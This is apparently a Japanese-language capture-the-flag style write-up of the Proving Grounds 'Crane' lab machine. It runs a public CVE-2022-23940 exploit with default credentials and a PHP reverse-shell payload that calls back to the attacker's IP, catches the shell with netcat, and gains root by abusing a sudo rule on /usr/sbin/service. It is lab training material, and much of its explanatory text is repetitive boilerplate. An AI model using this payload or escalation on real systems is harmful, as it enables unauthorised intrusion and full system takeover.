---
title: "Proving Grounds - Crane (Linux)"
date: 2026-02-25
description: "Proving Grounds Crane Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-crane/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されているネットワークサービス |
| 主な侵入経路 | Web RCE (CVE-2022-23940) |
| 権限昇格経路 | ローカル列挙 -> 設定ミスの悪用 -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域を把握し、悪用が成功しやすい箇所を特定します。正確なサービス・コンテンツ探索により、無作為なテストを減らし、的を絞った後続アクションにつなげます。

## 初期足がかり

---
![Screenshot from the crane engagement](/assets/img/pg/crane/Pasted%20image%2020260106230400.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the crane engagement](/assets/img/pg/crane/Pasted%20image%2020260106230342.png)
*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/manuelz120/CVE-2022-23940
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 exploit.py -h http://192.168.243.146/index.php -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.193\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

```bash
❌[22:51][CPU:2][MEM:51][TUN0:192.168.45.193][...ound/Crane/CVE-2022-23940]
🐉 > python3 exploit.py -h http://192.168.243.146/index.php -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.193\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'" 
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
✅[22:39][CPU:2][MEM:50][TUN0:192.168.45.193][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.243.146] 39754
/bin/sh: 0: can't access tty; job control turned off
$ 
```

💡 なぜ有効か
初期足がかりのステップでは、発見した脆弱性を連鎖させてターゲットへの実行可能な制御を確立します。成功した足がかり技術は、コマンド実行やインタラクティブシェルのコールバックによって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
sudo -l
```

```bash
www-data@crane:/home$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

https://gtfobins.github.io/gtfobins/service/#sudo
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
www-data@crane:/home$ sudo /usr/sbin/service ../../bin/bash
```

```bash
www-data@crane:/home$ www-data@crane:/home$ sudo /usr/sbin/service ../../bin/bash
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat /root/proof.txt
```

```bash
root@crane:/# cat /root/proof.txt
dbcc317c88740fb78348619f39846097
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat /var/www/local.txt
```

```bash
root@crane:/home# cat /var/www/local.txt

2f201eb1104f5db209b0b1d44fcdb667
```

💡 なぜ有効か
権限昇格はローカルの設定ミス、安全でないパーミッション、信頼された実行パスに依存します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- CVE-2022-23940: https://nvd.nist.gov/vuln/detail/CVE-2022-23940
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
